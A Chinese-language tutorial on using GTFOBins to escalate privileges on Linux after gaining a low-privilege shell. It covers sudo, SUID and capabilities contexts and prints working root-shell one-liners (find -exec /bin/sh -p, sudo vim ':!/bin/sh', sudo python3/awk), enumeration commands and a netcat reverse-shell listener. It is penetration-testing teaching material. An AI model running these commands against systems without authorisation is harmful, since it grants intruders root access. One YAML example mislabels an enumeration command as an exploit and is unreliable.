# GTFOBins 使用教程（Linux 提权查表）

Living Off The Land（落地即用）查表工具使用指南。网站是"字典"，不是要背的内容，而是打靶 / 渗透测试时遇到对应场景去查的参考。

- 官网：https://gtfobins.github.io/
- Windows 侧对应工具：LOLBAS（见同目录 `LOLBAS.md`）

## 一、概念与定位

**Living Off The Land 思想**：不落地恶意文件、不调用陌生程序，利用系统自带、受信任的合法程序完成攻击动作（执行、读文件、弹 shell 等），杀软对白名单程序放行。

GTFOBins 收录了 Unix/Linux 二进制可被"滥用"的功能，**核心用途是权限提升**（sudo / SUID / Capabilities），附带文件读写、弹 shell、上传下载等。

两点注意：
- 查表不是漏洞库，用的是程序自带功能。
- 必须**先拿到目标机低权限 shell**，命令里的前提（真有 sudo / 真有 SUID）必须成立。

## 二、界面导航

- **顶部搜索框**：输入二进制名（如 `find`、`vim`、`python`）自动过滤，日常最常用。
- **首页功能标签**：`Shell`、`Command`、`Library load`、`File read`、`File write`、`Reverse shell`、`Bind shell`、`Upload`、`Download`、`Inherit`。点标签看"支持该功能的全部二进制"。
- 点进某个二进制进入详情页。

## 三、条目结构（核心：执行上下文 + 功能）

一条记录的渲染结构大致如下（source 是 YAML）：

```yaml
- name: find
  functions:
    - shell:
        sudo:          # 上下文 1：用 sudo 运行
          code: sudo find . -exec /bin/sh \; -quit
        suid:          # 上下文 2：二进制带 SUID 位
          code: ./find . -exec /bin/sh -p \; -quit
        capabilities:  # 上下文 3：带能力位
          code: getcap -r / 2>/dev/null
    - file-read:
        sudo:
          code: sudo find . -exec cat {} \;
```

**四个执行上下文，决定你抄哪条命令：**

| 上下文 | 含义 | 识别前提 |
|---|---|---|
| `sudo` | 你能通过 sudo 以 root 跑它 | `sudo -l` 里出现该程序 |
| `suid` | 文件是 SUID（执行时获得属主权限） | `find / -perm -4000 -type f` |
| `capabilities` | 带 `CAP_*` 能力位（如 `cap_setuid`） | `getcap -r / 2>/dev/null` |
| `limited-suid` | SUID 但有额外限制，需特殊技巧 | 上一条查到但常规命令失败时 |

同一条命令，上下文不同写法就不同，不要拿 sudo 的命令去 SUID 场景用。

### 3.1 SUID 与 SGID：s 权限位

`s` 会出现在文件权限的"所有者"或"用户组"位置，含义略有不同：

| 你看到的权限 | 名称 | 含义（关键） |
|---|---|---|
| `-rwsr-xr-x` | SUID (Set User ID) | 任何用户执行此文件时，进程的有效用户 ID (EUID) 会变成文件所有者的 ID。如果文件所有者是 root，执行者就临时获得 root 权限。 |
| `-rwxr-sr-x` | SGID (Set Group ID) | 任何用户执行此文件时，进程的有效组 ID (EGID) 会变成文件所属组的 ID。如果文件所属组是 root 组，执行者就临时获得 root 组的权限。 |

检测命令：
- SUID：`find / -perm -4000 -type f 2>/dev/null`
- SGID：`find / -perm -2000 -type f 2>/dev/null`

这也是 GTFOBins 里 SUID 上下文弹 shell 要加 `-p` 的原因：bash 检测到 euid != uid 时默认主动降权，`-p`（privileged 模式）保留有效 UID。

### 3.2 命令前缀约定

- `sudo <cmd>`：需要你确实有 sudo 权限。
- `./<cmd> ...`：表示该二进制是 SUID 的，用相对路径 `./` 执行。原因：通过 PATH 执行可能命中别的同名程序或导致 bash 降权；`./` 保证执行的是"当前目录这个 SUID 程序"。实战中可写成全路径（如 `/usr/bin/find ...`）。
- `-p`（如 `/bin/sh -p`）：privileged 模式，**保留有效 UID**。SUID 弹 shell 几乎必须加，否则弹出来还是普通用户。

**占位符**：`attacker.com`（攻击机 IP）、`12345`（端口）、`/path/to/...`、`DATA`（写入内容）都是占位符，必须替换成自己的值。

## 四、完整实战流程

前提：已拿到目标机低权限 shell（如 `www-data`）。

```
1. 枚举本机特权程序
   sudo -l                                     → 看能 sudo 什么
   find / -perm -4000 -type f 2>/dev/null      → 找 SUID 文件
   getcap -r / 2>/dev/null                     → 找能力位程序

2. 假设发现 /usr/bin/find 带 SUID
   打开 gtfobins.github.io，搜索 find

3. 定位 suid 上下文下的 shell 命令：
   ./find . -exec /bin/sh -p \; -quit

4. 执行（改全路径，在当前目录跑）：
   cd /tmp
   /usr/bin/find . -exec /bin/sh -p \; -quit

5. 验证：id   → 看到 uid=0(root) 即成功
```

其他场景示例：
- `sudo -l` 显示可 sudo vim：`sudo vim -c ':!/bin/sh'`
- sudo python3：`sudo python3 -c 'import os; os.system("/bin/bash")'`
- SUID bash：`/bin/bash -p`
- sudo awk：`sudo awk 'BEGIN {system("/bin/sh")}'`

## 五、坑点

- 命令只是示例，端口、路径、文件名都要替换。
- `reverse-shell` 需要本机先 `nc -lvnp 12345` 监听，命令里的端口要和监听一致。
- 部分条目标注 `blind`（无回显）、`tty`（是否交互 TTY）等限制。
- 查表不是自动利用：命令给你的前提（真有 sudo / 真有 SUID）必须已成立。

## 六、自动化

- **JSON API**：`https://gtfobins.github.io/api.json`（另有 `/mitre.json`）。可写脚本把枚举出的 SUID / sudo 列表拉下来和 JSON 比对，自动输出可利用项。
- **linpeas（PEASS-ng）**：自动枚举 Linux 目标机的提权点，输出中直接标注对应 GTFOBins 的条目，照抄即可，最省事。

## 七、一页速查

| 想干什么 | 查哪里 | 示例 |
|---|---|---|
| 提权（sudo / SUID / capabilities） | 按发现的程序名查 | `sudo vim -c ':!/bin/sh'` |
| 弹 shell / 反弹 | Reverse shell 标签 | 按上下文抄命令 |
| 读任意文件 | File read 标签 | `sudo find . -exec cat {} \;` |
| 下载 / 上传文件 | Download / Upload 标签 | 按上下文抄命令 |

## 参考来源

- GTFOBins Contributing / conventions：https://gtfobins.org/contributing/#conventions
- pwncat GTFOBins API 文档：https://github.com/calebstewart/pwncat/blob/v0.3.1/docs/source/api/gtfobins.rst
- What is GTFOBins（SecureLayer7）：https://securelayer7.net/learn/privilege-escalation/what-is-gtfobins
